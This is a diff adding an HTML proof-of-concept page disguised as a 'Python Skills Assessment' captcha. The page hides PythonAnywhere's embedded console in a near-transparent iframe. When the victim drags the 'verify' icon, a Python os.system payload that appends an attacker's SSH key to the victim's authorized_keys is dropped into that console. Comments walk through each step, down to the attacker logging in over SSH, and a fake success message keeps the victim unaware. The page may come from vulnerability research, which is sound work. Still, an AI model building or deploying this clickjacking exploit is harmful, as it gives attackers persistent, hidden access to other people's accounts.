@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Python Skills Assessment</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #1a1a2e;
+  color: #eee;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  margin: 0;
+}
+.container {
+  text-align: center;
+  max-width: 500px;
+}
+h1 { color: #e94560; margin-bottom: 10px; }
+p { color: #aaa; margin-bottom: 30px; }
+
+/* The draggable "verification" element */
+.verify-box {
+  background: linear-gradient(135deg, #0f3460, #16213e);
+  border: 2px dashed #e94560;
+  border-radius: 12px;
+  padding: 30px;
+  cursor: grab;
+  user-select: none;
+  transition: all 0.3s;
+}
+.verify-box:hover {
+  border-color: #48bb78;
+  background: linear-gradient(135deg, #16213e, #1a1a2e);
+}
+.verify-box:active { cursor: grabbing; }
+.verify-icon { font-size: 48px; margin-bottom: 10px; }
+.verify-text { font-size: 14px; color: #aaa; }
+.verify-label { font-size: 18px; font-weight: bold; color: #48bb78; margin: 10px 0; }
+
+/* Drop target area (looks like a verification zone) */
+.drop-zone {
+  margin-top: 20px;
+  border: 2px dashed #333;
+  border-radius: 12px;
+  padding: 40px;
+  color: #555;
+  font-size: 14px;
+  position: relative;
+  min-height: 100px;
+  transition: all 0.3s;
+}
+.drop-zone.over {
+  border-color: #48bb78;
+  background: rgba(72,187,120,0.05);
+  color: #48bb78;
+}
+.success-msg {
+  display: none;
+  color: #48bb78;
+  font-size: 18px;
+  margin-top: 20px;
+}
+
+/*
+  HIDDEN CONSOLE IFRAME
+  - Loads PythonAnywhere's embedded console
+  - Positioned EXACTLY behind the drop zone
+  - Transparent so victim can't see it
+  - Console spawns in victim's account (SameSite=None cookie)
+  - hterm terminal accepts drag-drop as paste input
+*/
+.console-iframe {
+  position: fixed;
+  /* Position to cover the drop zone area */
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  opacity: 0.0001; /* Nearly invisible but still receives events */
+  z-index: 10;     /* Above the visible page */
+  border: none;
+  pointer-events: none; /* Don't block normal interaction */
+}
+
+/* When dragging, enable pointer events on the iframe so the drop lands on it */
+.console-iframe.active {
+  pointer-events: all !important;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Python Skills Assessment</h1>
+  <p>Complete the verification to access the interactive tutorial</p>
+
+  <!-- DRAGGABLE ELEMENT: victim drags this -->
+  <div class="verify-box"
+       id="dragItem"
+       draggable="true">
+    <div class="verify-icon">🐍</div>
+    <div class="verify-label">Drag to Verify</div>
+    <div class="verify-text">Drag the Python icon to the box below</div>
+  </div>
+
+  <!-- VISIBLE DROP ZONE: victim sees this -->
+  <div class="drop-zone" id="dropZone">
+    ⬇ Drop here to verify you're human ⬇
+  </div>
+
+  <div class="success-msg" id="successMsg">
+    ✅ Verified! Loading tutorial...
+  </div>
+</div>
+
+<!--
+  HIDDEN IFRAME: PythonAnywhere embedded console
+  - No X-Frame-Options on /embedded3/ = can be iframed ✓
+  - Session cookie SameSite=None = sent cross-site ✓
+  - Console spawns in victim's account ✓
+  - hterm handles drop events as paste ✓
+-->
+<iframe
+  id="consoleFrame"
+  class="console-iframe"
+  src="https://www.pythonanywhere.com/embedded3/"
+></iframe>
+
+<script>
+// ══════════════════════════════════════════════════════════
+// CONFIGURATION — Replace with YOUR attacker SSH public key
+// ══════════════════════════════════════════════════════════
+var ATTACKER_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnl5m2NP227Tji71XUNv4Pd3TYfrl3HPpfj3K6t1kSJ AttackerAccount@green-liveconsole7';
+
+// ══════════════════════════════════════════════════════════
+// BUILD THE PAYLOAD
+// The embedded console opens an IPython prompt.
+// We use Python's os.system() to run bash commands.
+// The \n at the end makes IPython execute it immediately.
+// ══════════════════════════════════════════════════════════
+var payload = 'import os; os.system("mkdir -p ~/.ssh && echo \'' + ATTACKER_KEY + '\' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys")\n';
+
+var dragItem = document.getElementById('dragItem');
+var dropZone = document.getElementById('dropZone');
+var iframe = document.getElementById('consoleFrame');
+var successMsg = document.getElementById('successMsg');
+
+// ══════════════════════════════════════════════════════════
+// DRAG START: Set the payload as the drag data
+// The victim thinks they're dragging a verification icon.
+// Actually, the drag data contains the malicious command.
+// ══════════════════════════════════════════════════════════
+dragItem.addEventListener('dragstart', function(e) {
+  // Set the malicious command as the dragged text
+  e.dataTransfer.setData('text/plain', payload);
+  e.dataTransfer.effectAllowed = 'copy';
+
+  // Make the iframe receive drop events
+  iframe.classList.add('active');
+
+  console.log('[Attack] Drag started — payload set');
+  console.log('[Attack] Payload: ' + payload.substring(0, 60) + '...');
+});
+
+dragItem.addEventListener('dragend', function(e) {
+  // Hide iframe pointer events after drag
+  iframe.classList.remove('active');
+});
+
+// ══════════════════════════════════════════════════════════
+// DROP ZONE VISUAL EFFECTS (for the social engineering)
+// ══════════════════════════════════════════════════════════
+dropZone.addEventListener('dragover', function(e) {
+  e.preventDefault();
+  dropZone.classList.add('over');
+});
+
+dropZone.addEventListener('dragleave', function(e) {
+  dropZone.classList.remove('over');
+});
+
+dropZone.addEventListener('drop', function(e) {
+  e.preventDefault();
+  dropZone.classList.remove('over');
+  // Show success message to keep the victim unsuspicious
+  dropZone.style.display = 'none';
+  successMsg.style.display = 'block';
+  console.log('[Attack] Drop detected on visible zone');
+});
+
+// ══════════════════════════════════════════════════════════
+// WHAT HAPPENS WHEN THE DROP LANDS ON THE IFRAME:
+//
+// 1. The browser fires a 'drop' event on the hterm terminal
+//    inside the iframe
+//
+// 2. hterm's onDragAndDrop_ handler fires:
+//    data = e.dataTransfer.getData('text/plain')
+//    this.publish('paste', {text: data})
+//
+// 3. The pasted text (our payload) is sent through SockJS
+//    to the console server as keyboard input
+//
+// 4. IPython receives:
+//    import os; os.system("mkdir -p ~/.ssh && echo '...' >> ...")
+//
+// 5. The \n at the end triggers execution
+//
+// 6. SSH key is now in victim's ~/.ssh/authorized_keys
+//
+// 7. Attacker SSHs from their PythonAnywhere console:
+//    ssh -o StrictHostKeyChecking=no VictimUser@10.0.5.XXX
+//
+// ALL OF THIS HAPPENS FROM A SINGLE DRAG-AND-DROP ACTION.
+// THE VICTIM THINKS THEY VERIFIED A CAPTCHA.
+// ══════════════════════════════════════════════════════════
+
+console.log('[Attack] Page loaded');
+console.log('[Attack] Iframe loading PythonAnywhere embedded console...');
+console.log('[Attack] Waiting for victim to drag and drop...');
+</script>
+
+</body>
+</html>
